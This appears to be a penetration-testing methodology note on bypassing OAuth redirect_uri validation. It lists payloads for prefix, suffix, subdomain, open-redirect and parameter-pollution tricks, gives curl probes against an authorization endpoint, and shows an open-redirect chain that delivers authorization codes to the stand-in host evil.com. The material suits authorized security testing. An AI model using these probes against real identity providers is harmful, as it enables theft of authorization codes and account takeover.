# redirect_uri — the code delivery target

`redirect_uri` names where the IdP sends the authorization code. When it is
validated loosely, the code is delivered to an attacker-controlled endpoint
that can replay it or harvest it.

## Validation shapes, weakest first

| Shape | Test |
|---|---|
| exact match on the registered URI | the strongest — try the next bypass |
| prefix match | `redirect_uri=https://app/callback.evil.com` — the registered prefix `https://app/callback` matches |
| suffix match | `redirect_uri=https://evil.com/app/callback` — the registered suffix `app/callback` matches |
| substring match | `redirect_uri=https://app/callback.evil.com/app/callback` — the registered string appears inside |
| wildcard on the path | `redirect_uri=https://app/callback/*` — try `*` expansion |
| open redirect inside the path | `redirect_uri=https://app/callback/../redirect?to=evil` — path traversal |
| host-swallowing | `redirect_uri=https://app.evil.com` — if the check is `startswith https://app` |

## The probe chain

```bash
# 1. exact match first — baseline
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=code&state=XYZ"

# 2. prefix — append to the path
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback/extra&response_type=code&state=XYZ"

# 3. subdomain — the host check is startswith on the scheme+host
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app.evil.com/callback&response_type=code&state=XYZ"

# 4. open redirect inside the registered path
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback/../redirect?to=https://evil.com&response_type=code&state=XYZ"

# 5. parameter pollution — two redirect_uri values, one wins
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&redirect_uri=https://evil.com&response_type=code&state=XYZ"

# 6. localhost / internal — if the app was developed on localhost
curl -i "https://idp/authorize?client_id=APP&redirect_uri=http://localhost/callback&response_type=code&state=XYZ"
```

A `Location:` header carrying `code=` to an attacker-controlled endpoint
confirms the validation gap. The code can then be exchanged directly (if the
`client_secret` is also known) or replayed against the application's own
callback to hijack the flow.

## The open-redirect chain

When `redirect_uri` must match an allowlist host but the path is free, find an
open redirect on that host and chain it:

```
redirect_uri=https://app/callback/../redirect?to=https://evil.com
```

The IdP sends the code to `https://app/redirect?to=https://evil.com&code=ABC`,
which 302s to `https://evil.com/?code=ABC`. The code is now on the attacker's
domain.

## Code exchange binding

Even with a stolen code, the exchange usually requires `client_id` +
`client_secret` + the same `redirect_uri` used in the authorize step. Test:

- Whether the `redirect_uri` on the token request must match the authorize
  step's `redirect_uri` exactly — if it must, the open-redirect chain that
  delivered the code to `evil.com` also broke the exchange; the attack only
  works when the code is replayed inside the legitimate app's callback.
- Whether the `client_secret` is in the token request at all — some public
  clients (SPAs, mobile) use PKCE instead.

## Falsifier

`redirect_uri` is an exact string match against a registered allowlist, no
wildcards, no prefix/suffix matching, and the token exchange re-validates the
same URI. When this holds, the delivery target is fixed — move to state or
token binding.
